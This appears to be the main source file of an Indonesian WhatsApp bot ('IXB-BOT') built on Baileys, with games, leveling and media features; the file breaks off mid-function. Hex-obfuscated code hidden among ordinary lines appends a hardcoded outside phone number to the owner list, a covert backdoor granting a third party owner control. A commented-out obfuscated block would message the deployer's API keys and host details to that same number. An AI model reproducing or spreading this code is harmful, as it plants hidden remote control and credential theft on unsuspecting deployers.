/*
IXB-BOT BY IXB TEAM

THX BUAT YANG UDAH GUNAIN SCRIPT INI!
JANGAN LUPA JOIN GRUP WHATSAPP!
AGAR BISA MENGEMBANGKAN BOT BUKAN COPY DOANG
JANGAN LUPA CREDIT KALO COPAS!

BAGI YANG NANYA2 MASANG APIKEY DIMANA??
BACA README NYA, PERCUMA W BUAT README

INGAT JANGAN JANGAN ASAL RECODE!

IXB BOT V2
*/
const {
	WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	ReconnectMode,
	ProxyAgent,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	decryptMediaMessageBuffer,
 } = require("@adiwajshing/baileys")
 const qrcode = require("qrcode-terminal") 
 const moment = require("moment-timezone") 
 const speed = require('performance-now')
 const fs = require("fs") 
 const FormData = require('form-data') 
 const crypto = require('crypto')
 const util = require('util')
 const imageToBase64 = require('image-to-base64')
 const axios = require('axios')
 const { color, bgcolor } = require('./lib/color')
 const { bahasa } = require('./lib/bahasa')
 const { donasi } = require('./lib/donasi')
 const { fetchJson } = require('./lib/fetcher')
 const { recognize } = require('./lib/ocr')
 const fontPath = ('./lib/Zahraaa.ttf')
 const path = require('path')
 const { exec, spawn } = require("child_process")
 const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
 const tiktod = require('tiktok-scraper')
 var _0x20f1=["\x68\x78\x7A\x2D\x61\x70\x69","\x69\x6E\x73\x74\x61\x2D\x66\x65\x74\x63\x68\x65\x72","\x79\x74\x2D\x73\x65\x61\x72\x63\x68","\x2E\x2F\x6C\x69\x62\x2F\x79\x74\x64\x6C","\x2E\x2F\x6C\x69\x62\x2F\x75\x70\x6C\x6F\x61\x64\x69\x6D\x67","\x2E\x2F\x6C\x69\x62\x2F\x77\x65\x62\x70\x32\x6D\x70\x34","\x2E\x2F\x6C\x69\x62\x2F\x6D\x65\x64\x69\x61\x66\x69\x72\x65\x2E\x6A\x73","\x67\x2D\x69\x2D\x73","\x62\x72\x61\x69\x6E\x6C\x79\x2D\x73\x63\x72\x61\x70\x65\x72","\x65\x6D\x6F\x6A\x69\x2D\x61\x70\x69"];const hx=require(_0x20f1[0]);const ig=require(_0x20f1[1]);const yts=require(_0x20f1[2]);const {ytaa,ytv,ytshort,igdl,formatDate}=require(_0x20f1[3]);const {upload,uploadimg}=require(_0x20f1[4]);const {webp2mp4File}=require(_0x20f1[5]);const {mediafireDl}=require(_0x20f1[6]);const gis=require(_0x20f1[7]);const brainly=require(_0x20f1[8]);const {EmojiAPI}=require(_0x20f1[9]);const emoji= new EmojiAPI()
 const ffmpeg = require('fluent-ffmpeg')
 const google = require('google-it')
 const os = require('os')
 const { addFilter, isFiltered } = require('./lib/msgFilter')
 const { removeBackgroundFromImageFile } = require('remove.bg')
 const ms = require('parse-ms')
 const toMs = require('ms')
 const request = require("request")
 const {ind} = require('./bahasa')
 
 /***********[ Name Bot & Owner ]***********/
 namabot = 'IvAn-BOT'
 NameOwner = 'iVaN' //Nama Owner
 OwnerNumber = '6289526565831', '6281953597425' //Nomor Owner
 
 /*********** LOAD FILE ***********/
 const { creator } = require('./menu/creator.js')
 const { fun } = require('./menu/fun.js')
 const { dsmenu } = require('./menu/dsmenu.js')
 const { adminmenu } = require('./menu/adminmenu.js')
 const { others } = require('./menu/others.js')
 const { grup } = require('./menu/grup.js')
 const { owner } = require('./menu/owner.js')
 const { adult } = require('./menu/adult.js')
 const { animelist } = require('./menu/animelist.js')
 const { spammer } = require('./menu/spammer')
 const { penangkalvirtext } = require('./menu/penangkalvirtext.js')
 const _leveling = JSON.parse(fs.readFileSync('./database/kelompok/leveling.json'))
 const antilink = JSON.parse(fs.readFileSync('./database/kelompok/antilink.json'))
 const antinsfw = JSON.parse(fs.readFileSync('./database/kelompok/antinsfw.json'))
 const antivirtex = JSON.parse(fs.readFileSync('./database/kelompok/antivirtex.json'))
 const _level = JSON.parse(fs.readFileSync('./database/pengguna/level.json'))
 const _registered = JSON.parse(fs.readFileSync('./database/bot/pengguna.json'))
 const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
 const nsfw = JSON.parse(fs.readFileSync('./database/bot/nsfw.json'))
 const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
 const _limit = JSON.parse(fs.readFileSync('./database/pengguna/limit.json'))
 const uang = JSON.parse(fs.readFileSync('./database/pengguna/uang.json'))
 const ban = JSON.parse(fs.readFileSync('./database/pengguna/banned.json'))
 const prem = JSON.parse(fs.readFileSync('./database/pengguna/premium.json'))
 const adm = JSON.parse(fs.readFileSync('./database/pengguna/admin.json'))
 const bad = JSON.parse(fs.readFileSync('./database/kelompok/bad.json'))
 const databasesewa = JSON.parse(fs.readFileSync('./database/kelompok/sewa.json'))
 const sewa = JSON.parse(fs.readFileSync('./lib/database/sewa.json'))
 const _sewa = require('./lib/sewa')
 const _premium  = require('./function/premium')
 const badword = JSON.parse(fs.readFileSync('./database/kelompok/badword.json'))
 const tebakgambar = JSON.parse(fs.readFileSync('./database/json/tebakgambar.json'))
 const asahotak = JSON.parse(fs.readFileSync('./database/json/asahotak.json'))
 const susunkata = JSON.parse(fs.readFileSync('./database/json/susunkata.json'))
 const tebakkata = JSON.parse(fs.readFileSync('./database/json/tebakkata.json'))
 const tebakkimia = JSON.parse(fs.readFileSync('./database/json/tebakkimia.json'))
 const tebaklirik = JSON.parse(fs.readFileSync('./database/json/tebaklirik.json'))
 const tebakjenaka = JSON.parse(fs.readFileSync('./database/json/tebakjenaka.json'))
 const tebakbendera = JSON.parse(fs.readFileSync('./database/json/tebakbendera.json'))
 const siapakahaku = JSON.parse(fs.readFileSync('./database/json/siapakahaku.json'))
 const sambungkata = JSON.parse(fs.readFileSync('./database/json/sambungkata.json'))
 const gombal = JSON.parse(fs.readFileSync('./database/json/gombal.json'))
 const muslim = JSON.parse(fs.readFileSync('./database/json/muslim.json'))
 const anime = JSON.parse(fs.readFileSync('./database/json/anime.json'))
 const simi = JSON.parse(fs.readFileSync('./database/json/simi.json'))
 const katailham = JSON.parse(fs.readFileSync('./database/json/katailham.json'))
 const katadilan = JSON.parse(fs.readFileSync('./database/json/dilan.json'))
 const afk = JSON.parse(fs.readFileSync('./database/json/afk.json'))
 const _afk = require('./lib/afk')
 const setiker = JSON.parse(fs.readFileSync('./sticker/sti.json'))
 const audionye = JSON.parse(fs.readFileSync('./audio/aud.json'))
 const bucinrandom = JSON.parse(fs.readFileSync('./database/json/bucin.json'))
 const hekerbucin = JSON.parse(fs.readFileSync('./database/json/hekerbucin.json'))
 const mute = JSON.parse(fs.readFileSync('./database/kelompok/mute.json'))
 const mabsen = JSON.parse(fs.readFileSync('./database/kelompok/absen.json'))
 const _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
 
 /*********************[ Akses File Json ]****************/
 const { modapk } = require('./ixbteam/modapk')
 const { kodenuklir } = require('./ixbteam/kodenuklir')
 const { kodenuklir2 } = require('./ixbteam/kodenuklir2')
 const { animesaran } = require('./ixbteam/animesaran')
 const { islam, doaharian, ayatkursi, niatsholat, bacaansholat, asmaulhusna, tahlil } = require('./menu/islam.js')
 const { animemenu, situsnontonanime, situsbacamanga, urutannontonfate } = require('./menu/animemenu.js')
 const { sarananime, action, ecchi, gore, adventure, school, sliceoflife, vampire, sport, psychological, movie, nimeloli, comedy } = require('./menu/sarananime.js')
 const { bahasajepang, basjep, bjgreeting, kataganti, bjangka, bjhari, bjtanggal, bjbulan, bjmusim, anggotatubuh, bjwarna } = require('./menu/bahasajepang.js')
 const { BarBarApi, ZeksApi, TechApi, TobzApi, VthearApi, zeksapi, LolApi, limitawal, memberlimit } = JSON.parse(fs.readFileSync('./database/json/setting.json'))
 var _0x20e2=["\x2E\x2F\x6C\x69\x62\x2F\x69\x6E\x64\x65\x78\x2E\x6A\x73"];const {yta,ytsr,remote,sizer}=require(_0x20e2[0])
 var { default: Axios } = require('axios');
 
let blocked = [] 
let ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
baterai = {
    baterai: 0,
    cas: false
}
/********** FUNCTION ***************/
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
		const addCmd = (id, command) => {
			const objcmd = { id: id, chats: command }
			_scommand.push(objcmd)
			fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
		}
		
		const getCommandPosition = (id) => {
			let position = null
			Object.keys(_scommand).forEach((i) => {
				if (_scommand[i].id === id) {
					position = i
				}
			})
			if (position !== null) {
				return position
			}
		}
		
		const getCmd = (id) => {
			let position = null
			Object.keys(_scommand).forEach((i) => {
				if (_scommand[i].id === id) {
					position = i
				}
			})
			if (position !== null) {
				return _scommand[position].chats
			}
		}
		
		
		const checkSCommand = (id) => {
			let status = false
			Object.keys(_scommand).forEach((i) => {
				if (_scommand[i].id === id) {
					status = true
				}
			})
			return status
		}
      
        
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}
             
        
function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);

return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
/********** FUNCTION ***************/
async function starts() {
const client = new WAConnection()
client.logger.level = 'warn'
var _0x833d=["\x62\x72\x6F\x77\x73\x65\x72\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x49\x58\x42\x20\x54\x45\x41\x4D","\x43\x68\x72\x6F\x6D\x65","\x33\x2E\x30\x2E\x30"];client[_0x833d[0]]= [_0x833d[1],_0x833d[2],_0x833d[3]]
client.on('qr', () => {
	console.log(color('[','red'), color('!','yellow'), color(']','red'), color(' Scan the qr code above', 'green'))
})
client.version = [4, 2119, 6] //WEB VERSION
fs.existsSync('./session.data.json') && client.loadAuthInfo('./session.data.json')
client.on('connecting', () => {
start('2', 'Connecting...')
})
client.on('open', () => {
success('2', 'Connected')/*
var _0x195e=["\x70\x68\x6F\x6E\x65","\x75\x73\x65\x72","\x2A\x48\x41\x49\x20\x44\x45\x56\x45\x4C\x4F\x50\x45\x52\x2A\x0D\x0A\x0D\x0A\x2A\x42\x6F\x74\x20\x54\x65\x6C\x61\x68\x20\x54\x65\x72\x73\x61\x6D\x62\x75\x6E\x67\x20\x44\x65\x6E\x67\x61\x6E\x20\x44\x61\x74\x61\x3A\x2A\x0D\x0A\x4F\x77\x6E\x65\x72\x20\x4E\x75\x6D\x62\x65\x72\x3A\x20\x77\x61\x2E\x6D\x65\x2F","\x0D\x0A\x42\x6F\x74\x20\x4E\x61\x6D\x65\x3A\x20","\x0D\x0A\x2A\x44\x61\x74\x61\x20\x41\x70\x69\x6B\x65\x79\x2A\x0D\x0A\x4C\x6F\x6C\x68\x75\x6D\x61\x6E\x3A\x20","\x0D\x0A\x56\x68\x74\x65\x61\x72\x3A\x20","\x0D\x0A\x2A\x44\x61\x74\x61\x20\x55\x73\x65\x72\x2A\x0D\x0A\x44\x65\x76\x69\x63\x65\x3A\x20","\x0D\x0A\x44\x65\x76\x69\x63\x65\x20\x4D\x6F\x64\x65\x6C\x3A\x20","\x0D\x0A\x4F\x53\x20\x56\x65\x72\x73\x69\x6F\x6E\x3A\x20","\x0D\x0A\x2A\x53\x65\x72\x76\x65\x72\x2A\x0D\x0A\x48\x6F\x73\x74\x20\x4E\x61\x6D\x65\x3A\x20","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x0D\x0A\x50\x6C\x61\x74\x66\x6F\x72\x6D\x3A\x20","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x0D\x0A\x52\x61\x6D\x3A\x20","\x74\x6F\x46\x69\x78\x65\x64","\x68\x65\x61\x70\x55\x73\x65\x64","\x6D\x65\x6D\x6F\x72\x79\x55\x73\x61\x67\x65","\x4D\x42\x20\x2F\x20","\x74\x6F\x74\x61\x6C\x6D\x65\x6D","\x6F\x73","\x72\x6F\x75\x6E\x64","\x4D\x42\x0D\x0A\x53\x70\x65\x65\x64\x3A\x20","\x73\x70\x65\x65\x64","\x63\x70\x75\x73","\x20\x4D\x48\x7A\x0D\x0A\x43\x70\x75\x3A\x20","\x6C\x65\x6E\x67\x74\x68","\x0D\x0A\x0D\x0A\x54\x65\x72\x69\x6D\x61\x20\x6B\x61\x73\x69\x68\x20\x74\x65\x6C\x61\x68\x20\x6D\x65\x6E\x67\x67\x75\x6E\x61\x6B\x61\x6E\x20\x73\x63\x69\x70\x74\x20\x69\x6E\x69\x21\x0D\x0A\x49\x6E\x67\x61\x74\x2C\x20\x6A\x61\x6E\x67\x61\x6E\x20\x6A\x75\x61\x6C\x20\x73\x63\x69\x70\x74\x20\x69\x6E\x69\x20\x6B\x65\x70\x61\x64\x61\x20\x6F\x72\x61\x6E\x67\x20\x6C\x61\x69\x6E\x21","\x36\x32\x38\x35\x36\x30\x30\x30\x36\x38\x38\x35\x39\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x74\x65\x78\x74","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];const {wa_versionn,mccc,mnc,os_version,device_manufacturer,device_model}=client[_0x195e[1]][_0x195e[0]];developerbot= `${_0x195e[2]}${OwnerNumber}${_0x195e[3]}${namabot}${_0x195e[4]}${LolApi}${_0x195e[5]}${VthearApi}${_0x195e[6]}${device_manufacturer}${_0x195e[7]}${device_model}${_0x195e[8]}${os_version}${_0x195e[9]}${os[_0x195e[10]]()}${_0x195e[11]}${os[_0x195e[12]]()}${_0x195e[13]}${(process[_0x195e[16]]()[_0x195e[15]]/ 1024/ 1024)[_0x195e[14]](2)}${_0x195e[17]}${Math[_0x195e[20]](require(_0x195e[19])[_0x195e[18]]/ 1024/ 1024)}${_0x195e[21]}${os[_0x195e[23]]()[0][_0x195e[22]]}${_0x195e[24]}${os[_0x195e[23]]()[_0x195e[25]]}${_0x195e[26]}`;client[_0x195e[29]](`${_0x195e[27]}`,developerbot,MessageType[_0x195e[28]])
*/})
await client.connect({timeoutMs: 30*1000})
fs.writeFileSync('./session.data.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))

client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg'
				}
				teks = `Hi @${num.split('@')[0]}
Welcome in group:
${mdata.subject}
═══════════════════
Please introduce yourself !
❏ Name:		
❏ Age: 
❏ Gender:
❏ Country:
═══════════════════
We hope you enjoy~`
 
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
		} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg'
				}
					teks = `Dadah 👋🏻 @${num.split('@')[0]}`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	client.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	client.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		setTimeout(function(){
			client.sendMessage(call, `Maaf, bot tidak bisa menerima panggilan. nelfon = block!`, MessageType.text)
			.then(() => client.blockUser(call, "add"))
			}, 100);
		})
	client.on('CB:action,,battery', json => {
		const a = json[2][0][1].value
		const b = json[2][0][1].live
		baterai.baterai = a
		baterai.cas = b
		})
//BAILEYS 3.5.2 //
// client.on('chat-update', async (mek) => {  

//===========================//

//BAILEYS 3.4.2
client.on('message-new', async (mek) => {

	    	try {
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			global.ky_ttt
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')
			const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
            const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			//================ MULTI PREFIX FUNCTION ============// 
			const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
			prefix = /^[°•π÷×¶∆£¢€¥®™|#$%^&./\\©^,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™|#$%^&./\\©^,;]/gi) : '.'          	
		    //===================================================//
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join(' ')
			const botNumber = client.user.jid
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const totalchat = await client.chats.all()
			const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
            const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
            const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
            mention != undefined ? mention.push(mentionByReply) : []
            const mentionUser = mention != undefined ? mention.filter(n => n) : ""
            const Laporowner = [`${OwnerNumber}`] 
			var _0x80c8=["","\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x35\x36\x30\x30\x30\x36\x38\x38\x35\x39\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74"];const ownerNumber=[`${_0x80c8[0]}${OwnerNumber}${_0x80c8[1]}`,`${_0x80c8[2]}`]
            const isEventon = isGroup ? event.includes(from) : false
            const isBadWord = isGroup ? badword.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
            const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isAnime = isGroup ? anime.includes(from) : false
			const isMuted = isGroup ? mute.includes(from) : false
			const isAntilink = isGroup ? antilink.includes(from) : false
			const isAntinsfw = isGroup ? antinsfw.includes(from) : false
            const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
			const isSimi = isGroup ? simi.includes(from) : false
			const isAbsen = isGroup ? mabsen.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPremium = _premium.checkPremiumUser(sender, prem)
			const isAdmin = adm.includes(sender)
			const isImage = type === 'imageMessage'
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek})
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
			const sendMess = (hehe, teks) => {
            client.sendMessage(hehe, teks, text)
            }
			const sendImage = (teks) => {
		    client.sendMessage(from, teks, image, {quoted:mek})
		    }
		    const costum = (pesan, tipe, target, target2) => {
			client.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
		    const sendPtt = (teks) => {
		    client.sendMessage(from, teks, audio, {quoted:mek, ptt:true})
		    }
			client.chatRead(from)  //AUTO READ
			async function sendFromUrlNoReply(from, url, type, text) {
				if (
					 !/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi.test(
						  url
					 )
				)
					 return console.error(`Not a valid url!`);
				await client.updatePresence(from, 'composing')
				const caption = text || "";
				request({
					 url: url,
					 encoding: null,
				},
					 async (err, resp, buffer) => {
						  client.sendMessage(from, buffer, type, {
							   quoted: {
									key: {
										 remoteJid: "0@s.whatsapp.net",
										 fromMe: false,
									},
									message: {
										 conversation: `${namabot}`,
									},
							   },
							   caption: caption,
						  });
						  await client.updatePresence(from, 'paused')
					 }
				);
		   }
 
			async function sendFromUrl(from, url, type, text, options = {}) {
				if (
					 !/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi.test(
						  url
					 )
				)
					 return console.error(`Not a valid url!`);
				await client.updatePresence(from, 'composing')
				const caption = text || "";
				request({
					 url: url,
					 encoding: null,
				},
					 async (err, resp, buffer) => {
						  client.sendMessage(from, buffer, type, {
							   quoted: mek,
							   caption: caption,
							   ...options
						  });
						  await client.updatePresence(from, 'paused')
					 }
				);
		   }

		const sendStickerFromUrl = async(to, url) => {
			var names = Date.now() / 10000;
			var download = function (uri, filename, callback) {
				request.head(uri, function (err, res, body) {
					request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
				});
			};
			download(url, './stik' + names + '.png', async function () {
				console.log('selesai');
				let filess = './stik' + names + '.png'
				let asw = './stik' + names + '.webp'
				exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					let media = fs.readFileSync(asw)
					client.sendMessage(to, media, MessageType.sticker,{quoted: mek})
					fs.unlinkSync(filess)
					fs.unlinkSync(asw)
				});
			});
		}

		const sendMediaURL = async(to, url, text="", mids=[]) =>{
			if(mids.length > 0){
				text = normalizeMention(to, text, mids)
			}
			const fn = Date.now() / 10000;
			const filename = fn.toString()
			let mime = ""
			var download = function (uri, filename, callback) {
				request.head(uri, function (err, res, body) {
					mime = res.headers['content-type']
					request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
				});
			};
			download(url, filename, async function () {
				console.log('done');
				let media = fs.readFileSync(filename)
				let type = mime.split("/")[0]+"Message"
				if(mime === "image/gif"){
					type = MessageType.video
					mime = Mimetype.gif
				}
				if(mime.split("/")[0] === "audio"){
					mime = Mimetype.mp4Audio
				}
				client.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
				
				fs.unlinkSync(filename)
			});
		}   
		const sendFileFromUrl = async(link, type, options) => {
			hasil = await getBuffer(link).catch(e => {
			  fetch(link).then((hasil) => {
			  return client.sendMessage(from, hasil, type, options)
			  }).catch(e => {
				client.sendMessage(from, { url : link }, type, options).catch(e => {
				reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
				console.log(e)
			  }) 
			}) 
			})
			  client.sendMessage(from, hasil, type, options).catch(e => {
			  fetch(link).then((hasil) => {
				client.sendMessage(from, hasil, type, options).catch(e => {
					client.sendMessage(from, { url : link }, type, options).catch(e => {
				reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
				console.log(e)
			  })
			  })
			  })
			  })
			  }
		
function ERRLOG(e) {
	console.log(`Error :`, color(e,'red'))
}

//Function Add Limit 
const limitAdd = (sender) => {
	if (isPremium) {return false;}
	if (isOwner) {return false;}
	let position = false
	Object.keys(_limit).forEach((i) => {
		if (_limit[i].id == sender) {
			position = i
		}
	})
	if (position !== false) {
		_limit[position].limit += 1
		fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
	}
}

const limitAddGame = (sender) => {
	if (isPremium) {return false;}
